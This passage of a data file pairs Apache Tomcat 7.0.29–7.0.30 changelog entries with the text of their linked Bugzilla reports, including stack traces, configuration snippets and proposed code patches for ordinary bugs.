java.lang.ArrayIndexOutOfBoundsException
	at java.lang.System.arraycopy(Native Method)
	at org.apache.coyote.http11.InternalOutputBuffer.write(InternalOutputBuffer.java:701)
	at org.apache.coyote.http11.InternalOutputBuffer.sendStatus(InternalOutputBuffer.java:438)
	at org.apache.coyote.http11.Http11Processor.prepareResponse(Http11Processor.java:1624)
	at org.apache.coyote.http11.Http11Processor.action(Http11Processor.java:956)
	at org.apache.coyote.Response.action(Response.java:181)
	at org.apache.coyote.http11.InternalOutputBuffer.endRequest(InternalOutputBuffer.java:398)
	at org.apache.coyote.http11.Http11Processor.process(Http11Processor.java:901)
	at org.apache.coyote.http11.Http11Protocol$Http11ConnectionHandler.process(Http11Protocol.java:602)
	at org.apache.tomcat.util.net.JIoEndpoint$Worker.run(JIoEndpoint.java:489)
	at java.lang.Thread.run(Unknown Source)

Aug 07, 2012 6:11:26 PM org.apache.coyote.http11.Http11Processor process
SEVERE: Error finishing response
java.lang.ArrayIndexOutOfBoundsException
	at java.lang.System.arraycopy(Native Method)
	at org.apache.coyote.http11.InternalOutputBuffer.write(InternalOutputBuffer.java:701)
	at org.apache.coyote.http11.InternalOutputBuffer.sendStatus(InternalOutputBuffer.java:438)
	at org.apache.coyote.http11.Http11Processor.prepareResponse(Http11Processor.java:1624)
	at org.apache.coyote.http11.Http11Processor.action(Http11Processor.java:956)
	at org.apache.coyote.Response.action(Response.java:181)
	at org.apache.coyote.http11.InternalOutputBuffer.endRequest(InternalOutputBuffer.java:398)
	at org.apache.coyote.http11.Http11Processor.process(Http11Processor.java:901)
	at org.apache.coyote.http11.Http11Protocol$Http11ConnectionHandler.process(Http11Protocol.java:602)
	at org.apache.tomcat.util.net.JIoEndpoint$Worker.run(JIoEndpoint.java:489)
	at java.lang.Thread.run(Unknown Source)"|https://bz.apache.org/bugzilla/show_bug.cgi?id=53677
Catalina|Tomcat 7.0.30 (markt)|fix|53702|When merging web.xml fragments, allow for <jsp-property-group> elements having multiple <url-pattern> elements. (markt)|Only the last url-pattern from jsp-property-group is processed|"Created attachment 29215 [details]
Modified files from the ROOT webapp

According to XSDs (jsp_2_0.xsd, jsp_2_1.xsd, jsp_2_2.xsd), the ""url-pattern"" can occur more than once in the same ""jsp-property-group"".

[[[
  <xsd:complexType name=""jsp-property-groupType"">
...
      <xsd:element name=""url-pattern""
                   type=""javaee:url-patternType""
                   maxOccurs=""unbounded""/>
]]]

There are three places where the ""jsp-property-group"" element is represented by an object in Tomcat:

a) in Jasper, o.a.jasper.compiler.JspConfig$JspPropertyGroup
b) in Catalina, o.a.catalina.deploy.JspPropertyGroup
c) in Servlet 3.0 API, javax.servlet.descriptor.JspPropertyGroupDescriptor (implemented by o.a.c.core.ApplicationJspPropertyGroupDescriptor)

The implementations in a) and c) are correct ones,  but in b) the collection of url patterns is mistakenly represented by a single value and setUrlPattern() method.

As the ""setUrlPattern"" method is called by digester (configured in o.a.c.startup.WebRuleSet), only the last url-pattern value survives.



The observable consequences of this issue:
===========================================
1. Merged web.xml is reproduced and passed to Jasper incorrectly.

(Currently it is passed only when metadata-complete=""false"" or absent, as I noted in Re:r1371995 on dev@, which is a different issue but it hides the effect of this one).

2. A known feature is that the paths mentioned in jsp-property-group are implicitly mapped to the JspServlet. Due to this issue this mapping occurs only for the last url-pattern.
(in WebXml#configureContext())


To reproduce in current 7.0.x (7.0.29 is affected):
====================================================
1. Unpack attached archive and put the files into the ROOT webapp.
The files are context.xml with <Context logEffectiveWebXml=""true""/>
and web.xml without metadata-compete attribute and adding the following:
[[[
  <jsp-config>
    <jsp-property-group>
      <url-pattern>*.foo</url-pattern>
      <url-pattern>*.bar</url-pattern>
      <is-xml>true</is-xml>
    </jsp-property-group>
  </jsp-config>
]]]

2. Start Tomcat and look into the ""catalina.`date`.log"" file. The merged web.xml should have been dumped there. Look for the ""jsp-property-group"" element.
Actual result:

[[[
  <jsp-config>
    <jsp-property-group>
      <url-pattern>*.bar</url-pattern>
      <is-xml>true</is-xml>
    </jsp-property-group>
  </jsp-config>
]]]

Expected result: both *.foo and *.bar should be mentioned.


Tomcat 6 does not have this issue, because there is no such object in Catalina there. The digester configured in WebRuleSet calls StandardContext.addJspMapping(..), which is additive."|https://bz.apache.org/bugzilla/show_bug.cgi?id=53702
Catalina|Tomcat 7.0.30 (markt)|add||Always make the resulting web.xml available even if metadata-complete is true. (markt)|||
Catalina|Tomcat 7.0.30 (markt)|fix|53714|Provide separate system properties to control which JARs are excluded from which scans when using the JarScanner. This allows JARs to be excluded from all scans or only from TLD scanning and/or Servlet 3.0 pluggability scanning. (markt)|misleading log output when jarsToSkip cointains web-fragments|"I have a jar which contains a web-fragment and no TLDs. When starting the server I get the Message:

org.apache.jasper.compiler.TldLocationsCache tldScanJar
INFO: At least one JAR was scanned for TLDs yet contained no TLDs. Enable debug logging for this logger for a complete list of JARs that were scanned but no TLDs were found in them. Skipping unneeded JARs during scanning can improve startup time and JSP compilation time.

so far so good.

When adding it to the tomcat.util.scan.DefaultJarScanner.jarsToSkip property the web-fragment won't be scanned either.

The log message should only be printed when no TLDs and web-fragments could be found in the jar."|https://bz.apache.org/bugzilla/show_bug.cgi?id=53714
Catalina|Tomcat 7.0.30 (markt)|update||Add several JDK libraries to the value of jarsToSkip property in the catalina.properties file. (markt, kkolinko)|||
Catalina|Tomcat 7.0.30 (markt)|fix||Fix typos etc. in the code that logs merged web.xml (as enabled by logEffectiveWebXml option on Context). (kkolinko)|||
Catalina|Tomcat 7.0.30 (markt)|fix|53758|When adding filters via FilterRegistration.Dynamic the filters were added at the wrong point because the isMatchAfter logic was inverted. (markt)|Dynamic Filter Registration mapping logic inverted|"In the class org.apache.catalina.core.ApplicationFilterRegistration, the methods addMappingForServletNames and addMappingForUrlPatterns have inverted logic on how to register the filter to the context.

If the parameter isMatchAfter is passed as true, the filter is placed in the context using the addFilterMapBefore method.

if (isMatchAfter) {
    context.addFilterMapBefore(filterMap);
} else {
    context.addFilterMap(filterMap);
}

The logic should ultimate be (in both methods):

if (!isMatchAfter) {
    context.addFilterMapBefore(filterMap);
} else {
    context.addFilterMap(filterMap);
}

or

if (isMatchAfter) {
    context.addFilterMap(filterMap);
} else {
    context.addFilterMapBefore(filterMap);
}



svn rev on trunk is 1375614"|https://bz.apache.org/bugzilla/show_bug.cgi?id=53758
Catalina|Tomcat 7.0.30 (markt)|fix|53783|Correctly handle JARs generated by tools that do not create specific entries for directories. Patch provided by Violeta Georgieva. (markt)|Static resources and jsp files under WEB-INF/lib/*.jar!/META-INF/resources are not found|"Created attachment 29283 [details]
Example

Hi,

According to Servlet Specification, Servlet container should serve static resources and jsp files, located in META-INF/resources in any jar file under WEB-INF/lib.

""
10.5  Directory Structure
A Web application exists as a structured hierarchy of directories. The root of this hierarchy serves as the document root for files that are part of the application. For example, for a Web application with the context path /catalog in a Web container, the index.html file at the base of the Web application hierarchy or in a JAR file inside WEB-INF/lib that includes the index.html under META-INF/resources directory can be served to satisfy a request from /catalog/index.html. If an index.html is present both in the root context and in the META-INF/resources directory of a JAR file in the WEB-INF/lib directory of the application, then the file that is available in the root context MUST be used.
""

When requesting such static resource/jsp file, Tomcat returns 404 Not Found.

Example is attached.
Request:
http://localhost:8080/test-meta-inf-resources/test.jsp
http://localhost:8080/test-meta-inf-resources/meta_inf_resource.jsp

After investigating the issue I think that the problem is in the following code:
org.apache.catalina.startup.ContextConfig
protected void processResourceJARs(Set<WebXml> fragments) {
...
    if (jar.entryExists(""META-INF/resources/"")) {
        context.addResourceJarUrl(url);
...
}

When I list the entries in jar, I receive:
INFO: Deploying web application archive C:\apache-tomcat-7.0.29\webapps\test-met
a-inf-resources.war
 META-INF/MANIFEST.MF
 META-INF/resources/meta_inf_resource.jsp

There is no entry ""META-INF/resources/""

I would like to propose a patch (attached) with which the request URLs above are working as expected.

Best Regards
Violeta Georgieva"|https://bz.apache.org/bugzilla/show_bug.cgi?id=53783
Catalina|Tomcat 7.0.30 (markt)|fix||Improvements to DIGEST authenticator including the disabling caching of authenticated user in session by default, tracking server rather than client nonces and better handling of stale nonce values. (markt)|||
Catalina|Tomcat 7.0.30 (markt)|fix||Improve performance of DIGEST authenticator for concurrent requests. (markt)|||
Catalina|Tomcat 7.0.30 (markt)|fix||CVE-2012-3546: Fix bypass of security constraint checks with FORM authentication. Remove unneeded processing in RealmBase. (kkolinko)|||
Catalina|Tomcat 7.0.30 (markt)|fix|53800|FileDirContext.list() did not provide correct paths for subdirectories. Patch provided by Kevin Wooten. (kkolinko)|"Infinte loop cause by FileDirContext in a CDI/Weld project when using Eclipse's ""Server modules without publishing"""|"Created attachment 29302 [details]
Patch for FileDirContext.java

Weld's TomcatListener is using the recurse method recited below. In the case I am encountering the DirContext that Tomcat provides is a FileDirContext.

The discovery code used by Weld encounters what appears to be a bug in FileDirContext where FileDirContexts for child directories are created with the current FileDirContext's path. This causes an infinite loop while it searches the root directory over and over.

Assuming the class discovery code Weld is using is correct, I tracked down the problem to a specific line in FileDirContext.java.  Fixing this line to set the path of the new child FileDirContext to the matching child directory fixes the issue I am encountering. With this change the project appears to still pass all the unit tests ran with ""ant test"". I have attached the patch to this issue.


Here is Weld's recurse function which I am assuming is correct...

protected static void recurse(DirContext context, Set<String> classes, Set<URL> urls, String prefix) throws Exception {
    if (prefix.length() > 0)
        prefix += ""."";

    NamingEnumeration ne = context.listBindings("""");
    while (ne.hasMoreElements()) {
        Binding next = (Binding) ne.nextElement();
        String name = prefix + next.getName();
        if (name.endsWith("".class"")) {
            classes.add(name.substring(0, name.length() - 6));
            continue;
        }

        Object nextObject = next.getObject();
        if (nextObject instanceof DirContext) {
            recurse((DirContext) nextObject, classes, urls, name);
        }
    }
}"|https://bz.apache.org/bugzilla/show_bug.cgi?id=53800
Catalina|Tomcat 7.0.30 (markt)|fix|53801|Overlapping URL patterns were sometimes merged incorrectly in security constraints leading to incorrect 401 responses. Note: it was possible for access to be denied when it should have been granted but it was not possible for access to be granted when it should have been denied. (markt)|Nondeterministic behaviour of security constraints|"Created attachment 29303 [details]
test web application that reproduces the issue

I'm experiencing a weird behaviour with certain combinations of security constraints having
the following pattern:
(i) one security constraint applies to (at least) two overlapping URL patterns ending in /*,
where one is more specific than the other (e.g., /a/* and /a/b/*)
(ii) a second security constraint applies only to the less specific URL pattern (e.g. /a/*),
and
(iii) the two security constraints apply to different (possibly overlapping) sets of methods.

One such example is as follows:

<servlet-mapping>
  <servlet-name>test</servlet-name>
  <url-pattern>/*</url-pattern>
</servlet-mapping>
<login-config>
  <auth-method>BASIC</auth-method>
  <realm-name>test</realm-name>
</login-config>

<security-constraint>
  <web-resource-collection>
    <web-resource-name/>
      <url-pattern>/a/*</url-pattern>
      <url-pattern>/a/b/*</url-pattern>
      <http-method>POST</http-method>
  </web-resource-collection>
</security-constraint>

<security-constraint>
  <web-resource-collection>
    <web-resource-name/>
      <url-pattern>/a/*</url-pattern>
        <http-method>GET</http-method>
    </web-resource-collection>
    <auth-constraint/>
</security-constraint>

The problem occurs for HTTP requests matching to the most specific URL pattern (in the above
example, /a/b, /a/b/c, etc.), but on methods other than the ones mentioned in the first security
constraint (in the above example, GET).

For instance, each time I deploy a web application with the above-mentioned deployment descriptor
in Tomcat, or each time I redeploy it or restart the server in case it is already deployed,
I get randomly either of the two following behaviours:

1) ""GET /a/b"" requests are allowed, i.e. no authentication is required
2) ""GET /a/b"" requests are denied, i.e. the response requires authentication (HTTP 401)

Notice that the behaviour remains then constant until I restart the server or re-deploy the
application. Also, adding arbitrary roles in either of the two auth-constraints, does not
seem to change the result.

According to the Java Servlet Specification, 1) is the correct behaviour. In fact, such requests
shall be allowed to any (possibly unauthenticated) users, because the constraint with the
most specific pattern (the first one) matches to the request, but it does not mention the
method of the request (GET).

I tested several different combinations of security constraints, but this issue seems to occur
only with those of this kind.


Please find attached a WAR that produces the above behaviour.

Here are some HTTP requests I tested together with the expected and actual results:

HTTP Request      Expected HTTP Response    Observed Behaviour
GET /test/a       403                       Always correct
GET /test/b       200                       Always correct
GET /test/a/b     200                       Sometimes incorrect (401 is given)
GET /test/a/b/    200                       Sometimes incorrect (401 is given)
GET /test/a/b/c   200                       Sometimes incorrect (401 is given)"|https://bz.apache.org/bugzilla/show_bug.cgi?id=53801
Coyote|Tomcat 7.0.30 (markt)|fix||Remove the socket.soTrafficClass from the BIO and NIO HTTP and AJP connectors because any use of the option is either ignored or in some cases (Java 7 with NIO) throws an Exception. (markt)|||
Coyote|Tomcat 7.0.30 (markt)|fix||Prevent possible NPE when processing Comet requests during Connector shutdown. (markt)|||
Coyote|Tomcat 7.0.30 (markt)|fix|42181|Better handling of edge conditions in chunk header processing. (kkolinko)|ArrayIndexOutOfBoundsException in parseChunkHeader|"Apr 22, 2007 11:53:32 AM org.apache.coyote.http11.Http11Processor process
SEVERE: Error finishing request
java.lang.ArrayIndexOutOfBoundsException: -28
        at
org.apache.coyote.http11.filters.ChunkedInputFilter.parseChunkHeader(ChunkedInputFilter.java:256)
        at
org.apache.coyote.http11.filters.ChunkedInputFilter.doRead(ChunkedInputFilter.java:129)
        at
org.apache.coyote.http11.filters.ChunkedInputFilter.end(ChunkedInputFilter.java:179)
        at
org.apache.coyote.http11.InternalInputBuffer.endRequest(InternalInputBuffer.java:368)
        at
org.apache.coyote.http11.Http11Processor.process(Http11Processor.java:894)
        at
org.apache.coyote.http11.Http11BaseProtocol$Http11ConnectionHandler.processConnection(Http11BaseProtocol.java:664)
        at
org.apache.tomcat.util.net.PoolTcpEndpoint.processSocket(PoolTcpEndpoint.java:527)
        at
org.apache.tomcat.util.net.LeaderFollowerWorkerThread.runIt(LeaderFollowerWorkerThread.java:80)
        at
org.apache.tomcat.util.threads.ThreadPool$ControlRunnable.run(ThreadPool.java:684)
        at java.lang.Thread.run(Thread.java:595)"|https://bz.apache.org/bugzilla/show_bug.cgi?id=42181
Coyote|Tomcat 7.0.30 (markt)|fix|53697|Correct a regression in the fix for 51881 that mean that in some circumstances the comet flag was not reset on HttpAprProcessor instances. This caused problems when the Processor was re-used for a new connection that would trigger a NullPointerException and could result in a JVM crash. (markt)|java.lang.NullPointerException at org.apache.coyote.http11.Http11AprProcessor.actionInternal(Http11AprProcessor.java:277)|"I hit tomcat with ~20 different urls in ~2 seconds, test some functionality, wait ~3 minutes, then do it again and I always get this exception and then I get (intermitent) connection interrupted messages in the browser.  Here's the full trace:

Aug 10, 2012 6:33:14 PM org.apache.catalina.connector.CoyoteAdapter event
SEVERE: null
Aug 10, 2012 6:33:14 PM org.apache.catalina.connector.CoyoteAdapter event
java.lang.NullPointerException
	at org.apache.coyote.http11.Http11AprProcessor.actionInternal(Http11AprProcessor.java:277)
	at org.apache.coyote.http11.AbstractHttp11Processor.action(AbstractHttp11Processor.java:846)
	at org.apache.coyote.Response.action(Response.java:172)
	at org.apache.catalina.connector.CoyoteAdapter.event(CoyoteAdapter.java:229)
	at org.apache.coyote.http11.Http11AprProcessor.event(Http11AprProcessor.java:133)
	at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:581)
	at org.apache.tomcat.util.net.AprEndpoint$SocketProcessor.run(AprEndpoint.java:1770)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1110)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:603)
	at java.lang.Thread.run(Thread.java:722)

Aug 10, 2012 6:33:14 PM org.apache.coyote.http11.Http11AprProcessor event
SEVERE: Error processing request
java.lang.NullPointerException
	at org.apache.coyote.http11.Http11AprProcessor.actionInternal(Http11AprProcessor.java:277)
	at org.apache.coyote.http11.AbstractHttp11Processor.action(AbstractHttp11Processor.java:846)
	at org.apache.coyote.Request.action(Request.java:346)
	at org.apache.catalina.connector.Request.getRemoteAddr(Request.java:1281)
	at org.apache.catalina.connector.Request.getRemoteHost(Request.java:1296)
	at org.apache.catalina.valves.AccessLogValve$HostElement.addElement(AccessLogValve.java:1327)
	at org.apache.catalina.valves.AccessLogValve.log(AccessLogValve.java:953)
	at org.apache.catalina.core.AccessLogAdapter.log(AccessLogAdapter.java:51)
	at org.apache.catalina.core.ContainerBase.logAccess(ContainerBase.java:1263)
	at org.apache.catalina.core.ContainerBase.logAccess(ContainerBase.java:1270)
	at org.apache.catalina.connector.CoyoteAdapter.event(CoyoteAdapter.java:250)
	at org.apache.coyote.http11.Http11AprProcessor.event(Http11AprProcessor.java:133)
	at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:581)
	at org.apache.tomcat.util.net.AprEndpoint$SocketProcessor.run(AprEndpoint.java:1770)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1110)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:603)
	at java.lang.Thread.run(Thread.java:722)

Additional information:
 - hp Proliant DL360 with two 3ghz processors
 - CentOS 6.3
 - One app runs websockets under bleading edge Atmosphere and Grails
 - the 20 urls come from chrome and firefox, simulatneously"|https://bz.apache.org/bugzilla/show_bug.cgi?id=53697
Coyote|Tomcat 7.0.30 (markt)|fix|53725|Fix possible corruption of GZIP'd output. (markt/kkolinko)|Some GZipped responses result in java.io.IOException: Corrupt GZIP trailer during gunzip.|"Created attachment 29238 [details]
Please see description for purpose of attachment.

FlushableGZIPOutputStream gives corrupt output in rare circumstances.  Tomcat 7 encounters this bug when compression is turned on.

Please see the attachment:  Compile and run ErrorCase.java which uses FlushableGZIPOutputStream to GZIP the contents of data.bin (included in the attachment) and then uses GZIPInputStream to gunzip the output of FlushableGZIPOutputStream, resulting in java.io.IOException: Corrupt GZIP trailer."|https://bz.apache.org/bugzilla/show_bug.cgi?id=53725
Coyote|Tomcat 7.0.30 (markt)|fix||Better parsing of line-terminators for requests using chunked encoding. (markt)|||
Coyote|Tomcat 7.0.30 (markt)|fix||Further improvements to handling of Comet END events when the connector is stopped. (markt)|||
Jasper|Tomcat 7.0.30 (markt)|fix|53545|Ensure buffered data is cleared when using a jsp:forward action inside a classic custom tag. (markt)|jsp:forward action to static resources causes IllegalStateException when inside classic custom tag|"If we have a JSP like the one below we get java.lang.IllegalStateException: getOutputStream() has already been called for this response:

Notes:
1. the jsp:forward is inside classic custom tag ( extends BodyTagSupport).
2. if I put a dynamic resource everything is fine (ex. redirect.jsp)
3. I think that the response gets flushed if jsp:forward redirects to a static resource and that's why the exception is trown.



test.jsp

<%@ page language=""java"" contentType=""text/html; charset=ISO-8859-1"" pageEncoding=""ISO-8859-1""%>
<%@ taglib prefix=""t"" uri=""test"" %> 

<t:do>  
  
<jsp:forward page=""redirect.html""/>
   
   
<!DOCTYPE html PUBLIC ""-//W3C//DTD HTML 4.01 Transitional//EN"" ""http://www.w3.org/TR/html4/loose.dtd"">
<html>
<head>
<meta http-equiv=""Content-Type"" content=""text/html; charset=ISO-8859-1"">
<title>Insert title here</title>
</head>
<body>
</body>
</html>

</t:do>"|https://bz.apache.org/bugzilla/show_bug.cgi?id=53545
Jasper|Tomcat 7.0.30 (markt)|fix|53654|Support file:// URLs for JSP dependencies. Patch provided by Viola Lu. (markt)|JSP file is always recompiled for using file based TLD URL|"Now, in Jasper codes, it only supports jar URL and relative URL, that may be enough for common web applications. While, it is possible that the third-party uses other protocol URL, like file: protocol based URL. So, the JSP files will be always recompiled for each access for the target page.
The codes are located in Compiler.isOutDated() method.
Is it possible to provide more generic handlering for the URL ?"|https://bz.apache.org/bugzilla/show_bug.cgi?id=53654
Jasper|Tomcat 7.0.30 (markt)|fix|53792|Support MethodExpressions that include a method invocation that is not at the end of the expression. (markt)|EL: AstValue.getTarget() mistakes a method invocation for a property access|"Trying to evaluate the method expression #{beanFactory.loginBean().init}

Expected behavior: lookup beanFactory, invoke its loginBean method and on its return value, invoke the init method.

Actual behavior: the following exception is thrown: 
javax.el.PropertyNotFoundException: /LoginView.xhtml @9,101 listener=""#{viewBeanFactory.loginBean().initIfGetRequest}"": Property 'loginBean' not found on type ch.bedag.redacted.InteractionLayer$$EnhancerByCGLIB$$1ea36cb9

Looking at the source, AstValue.getTarget(EvaluationContext) only checks whether the last child is an instanceof AstMethodParameters, but in this expression there is an additional method invocation expression before that ...

Presumably, the while loop 

            while (base != null && i < propCount) {
                property = this.children[i].getValue(ctx);
                ctx.setPropertyResolved(false);
                base = resolver.getValue(ctx, base, property);
                i++;
            }

should be something like:

            while (base != null && i < propCount) {
                if (i + 1 < propCount && this.children[i + 1] instanceof AstMethodParameters) {
                    base = // result of method invocation
                    i += 2;
                } else {
                    property = this.children[i].getValue(ctx);
                    ctx.setPropertyResolved(false);
                    base = resolver.getValue(ctx, base, property);
                    i++;
                }
            }"|https://bz.apache.org/bugzilla/show_bug.cgi?id=53792
Cluster|Tomcat 7.0.30 (markt)|fix||Fix an issue when running under Java 7 which throws exceptions when trying to set an invalid option whereas Java 6 silently swallowed them. The option using the problem was soTrafficClass. Investigations showed that this option had no effect for Cluster Channel Receivers so it was removed. (markt)|||
Cluster|Tomcat 7.0.30 (markt)|fix|53513|Fix race condition between the processing of session sync message and transfer complete message. (kfujino)|Race condition / out of order operation in session replication at node startup|"My configuration:

2 nodes running Tomcat 7.0.26
Using a custom session manager, which extends the DeltaManager

My startInternal() method first calls super.startInternal(), then performs a few additional initializations.

I reviewed the code of DeltaManager.startInternal(), and it calls getAllClusterSessions() which in turn calls waitForSendAllSessions(), which requires either getStateTransfered() to return true, or a timeout.

So by this, I should be able to trust that as the second node starts, the initial sync up of all session data from the first node has completed prior to the startInternal() method exiting (and thus prior to my initializations).

This is, however, not the case!  I can confirm this by repeatedly logging the value of findSessions().length during my inializations, and see that number going up!

There appears to be a race condition between the processing of the message containing the actual session data & the ""transfer complete"" message.  After tracing this through a little further, I see the stateTransfered is set to true in the handleALL_SESSION_TRANSFERCOMPLETE() callback method.  And that callback is being called PRIOR to the session data itself even being received!

Here is the debug logging output (slightly scrubbed) which shows this out of order messaging:

Jul 5, 2012 4:20:41 PM org.apache.catalina.ha.session.DeltaManager getAllClusterSessions
INFO: Manager [wwwtest#], requesting session state from org.apache.catalina.tribes.membership.MemberImpl[...].
This operation will timeout if no session state has been received within 60 seconds.

Jul 5, 2012 4:20:41 PM org.apache.catalina.ha.session.DeltaManager messageReceived
FINE: Manager [wwwtest#]: Received SessionMessage of type=(SESSION-STATE-TRANSFERED) from [org.apache.catalina.tribes.membership.MemberImpl[...]

Jul 5, 2012 4:20:41 PM org.apache.catalina.ha.session.DeltaManager handleALL_SESSION_TRANSFERCOMPLETE
FINE: Manager [wwwtest#] received from node [[B@6789b939:4,000] session state transfered.

Jul 5, 2012 4:20:41 PM org.apache.catalina.ha.session.DeltaManager messageReceived
FINE: Manager [wwwtest#]: Received SessionMessage of type=(ALL-SESSION-DATA) from [org.apache.catalina.tribes.membership.MemberImpl[...]

Jul 5, 2012 4:20:41 PM org.apache.catalina.ha.session.DeltaManager handleALL_SESSION_DATA
FINE: Manager [wwwtest#]: received session state data"|https://bz.apache.org/bugzilla/show_bug.cgi?id=53513
Web applications|Tomcat 7.0.30 (markt)|fix||Update JSTL version information in the JNDI section of the documentation web application. (markt)|||
Web applications|Tomcat 7.0.30 (markt)|fix|53524|Correct a typo in the cluster how-to section of the documentation web application. Also fix a handful of spelling errors. (markt)|Typo in cluster-howto.html|"tomcat-7.0-doc/cluster-howto.html:

In the section ""Configuration Example"", at the paragraph of ""Membership"", 

---
... be on a separate multicast address/port combination the the production cluster.
---

This ""the the"" may be a typo."|https://bz.apache.org/bugzilla/show_bug.cgi?id=53524
Web applications|Tomcat 7.0.30 (markt)|fix|53601|Clarify in documentation that building Apache Tomcat 7 from sources requires a Java 6 JDK. (kkolinko)|tomcat8 build fails with jdk1.6|"Currently tomcat7 can only be build with jdk1.7. 

That might become a problem as Servlet-3.0 mandatory requires java6 as environment."|https://bz.apache.org/bugzilla/show_bug.cgi?id=53601
Web applications|Tomcat 7.0.30 (markt)|fix|53653|Allow for wrapped source code example in config/context.html. Patch provided by Terence Bandoian. (schultz)|Allow for wrapped source code example in config/context.html|"Created attachment 29164 [details]
diff -u patch files for tomcat-docs.xsl and context.xml

Modify tomcat-docs.xsl and config/context.xml to allow last configuration example on page to wrap. This provides for a more readable HTML document."|https://bz.apache.org/bugzilla/show_bug.cgi?id=53653
Web applications|Tomcat 7.0.30 (markt)|update|53793|Change links on the list of applications in the Manager to point to '/appname/' instead of '/appname'. (kkolinko)|Change webapp links in Manager to point to /appname/ instead of /appname|"The first column of the table that lists Web Applications in Tomcat Manager webapp contains links to those applications, e.g.

  <a href=""/examples"">/examples</a>

When the link is clicked and browser navigates to ""/examples"", it results in 302 redirect to ""/examples/"".

It would be better to change that link to point directly to ""/examples/"".

  <a href=""/examples/"">/examples</a>

I am changing the link address only, but not the text on it. That is because the ""Path"" of the web application displayed in that column (and used in Manager commands elsewhere) does not have the additional '/'."|https://bz.apache.org/bugzilla/show_bug.cgi?id=53793
Tribes|Tomcat 7.0.30 (markt)|fix||Avoid potential NPE identified by Find Bugs in org.apache.catalina.tribes.io.ReplicationStream. (markt)|||
Tribes|Tomcat 7.0.30 (markt)|fix|53606|Fix potential NPE in TcpPingInterceptor. Based on a patch by F. Arnoud. (markt)|NullPointerException in TcpPingInterceptor|"start(int) method initializes failureDetector (resp. staticMembers) only if TcpFailureDetector (resp. StaticMembershipInterceptor) was found in channel interceptors stack.

Without TcpFailureDetector (resp. StaticMembershipInterceptor), futur calls to sendPing() will fail because failureDetector (resp. staticMembers) wasn't initialized at least to new WeakReference<StaticMembershipInterceptor>(null).

Fix:
v1) initializes weak references containers:
Replace:
    WeakReference<TcpFailureDetector> failureDetector = null;
    WeakReference<StaticMembershipInterceptor> staticMembers = null;
for:
    WeakReference<TcpFailureDetector> failureDetector = new WeakReference<TcpFailureDetector>();
    WeakReference<StaticMembershipInterceptor> staticMembers = new WeakReference<StaticMembershipInterceptor>();

v2) checks field before dereferencing it:
sendPing becomes:
    protected void sendPing() {
        if (failureDetector!=null && failureDetector.get()!=null) {
            //we have a reference to the failure detector
            //piggy back on that dude
            failureDetector.get().checkMembers(true);
        }else {
            if (staticOnly && staticMembers!=null && staticMembers.get()!=null) {
                sendPingMessage(staticMembers.get().getMembers());
            } else {
                sendPingMessage(getMembers());
            }
        }
    }



affect also tomcat 6
regards
fred arnoud"|https://bz.apache.org/bugzilla/show_bug.cgi?id=53606
Tribes|Tomcat 7.0.30 (markt)|fix|53607|To avoid NPE, set TCP PING data to ChannelMessage. Patch provided by F.Arnoud (kfujino)|No message set for PING: TcpPingInterceptor fail with NullPointerException in ChannelData.getDataPackageLength()|"I added 
        data.setMessage(new XByteBuffer(TCP_PING_DATA, false));

to TcpPingInterceptor send ping message function by:

    protected void sendPingMessage(Member[] members) {
        if ( members == null || members.length == 0 ) return;
        ChannelData data = new ChannelData(true);//generates a unique Id
        data.setAddress(getLocalMember(false));
        data.setTimestamp(System.currentTimeMillis());
        data.setOptions(getOptionFlag());
        data.setMessage(new XByteBuffer(TCP_PING_DATA, false));
        try {
            super.sendMessage(members, data, null);
        }catch (ChannelException x) {
            log.warn(""Unable to send TCP ping."",x);
        }
    }


error also for Tomcat 6
regards
fred"|https://bz.apache.org/bugzilla/show_bug.cgi?id=53607
Other|Tomcat 7.0.30 (markt)|fix|53701|Javadoc fixes. Patch provided by sebb. (markt)|Javadoc fixes|"Created attachment 29214 [details]
Javadoc fixes

The attached patch fixes various Javadoc issues"|https://bz.apache.org/bugzilla/show_bug.cgi?id=53701
Other|Tomcat 7.0.30 (markt)|code||Remove some unused code from Tomcat's package renamed, cut-down copy of Commons BCEL used for annotation scanning. (markt)|||
Other|Tomcat 7.0.30 (markt)|add|53735|Add support for Java 7 byte code to Tomcat's package renamed, cut-down copy of Commons BCEL used for annotation scanning. (markt)|Update annotation scanning to be compatible with Java 7 class files|"As was reported on the users mailing list, the annotation scanning code may fail when trying to scan a class compiled for Java 7. The thread:

""Tomcat 7.0.29 vs. Groovy with Java 7""
http://tomcat.markmail.org/thread/4y7jfmznleqdczwh

As said there, ""It appears that when one installs the groovy-all-2.0.1-indy.jar in a Tomcat web app, BCEL chokes on the Java 7 specific byte-code therein ala""
[[[
org.apache.tomcat.util.bcel.classfile.ClassFormatException: Invalid byte tag
in constant pool: 15 at
org.apache.tomcat.util.bcel.classfile.Constant.readConstant(Constant.java:131) at
org.apache.tomcat.util.bcel.classfile.ConstantPool.<init>(ConstantPool.java:60) at
org.apache.tomcat.util.bcel.classfile.ClassParser.readConstantPool(ClassParser.java:209) at
org.apache.tomcat.util.bcel.classfile.ClassParser.parse(ClassParser.java:119) at
org.apache.catalina.startup.ContextConfig.processAnnotationsStream(ContextConfig.java:2066)
]]]

If the problem is with specific libraries (like Groovy 2.0), it is possible to disable annotation scanning for them (see the thread above).

In general, though, as Tomcat 8 targets Java 7, it should be able to scan such files."|https://bz.apache.org/bugzilla/show_bug.cgi?id=53735
Catalina|Tomcat 7.0.29 (markt)|add||Add support for searching for roles in JNDI/LDAP using another value than the actual DN or username specified. Rather it will use a value from the users directory entry. The new attribute introduced to the JNDIRealm is userRoleAttribute (fhanik)|||
Catalina|Tomcat 7.0.29 (markt)|fix||Fix checking of recommended tcnative library version when using the APR connector. (rjung)|||
Catalina|Tomcat 7.0.29 (markt)|update|50306|Improve StuckThreadDetectionValve: add stuckThreadNames property as a pair for the stuckThreadIds one, add thread ids to the log messages. (kkolinko)|Detect stuck threads|"Feature request : 
regularly scan worker threads and if one has been processing the same request for longer than a configurable delay, log a warning with the stack trace of that thread.
This would allow to detect very long running threads, usually the ones that are stuck in a network call or in a deadlock."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50306
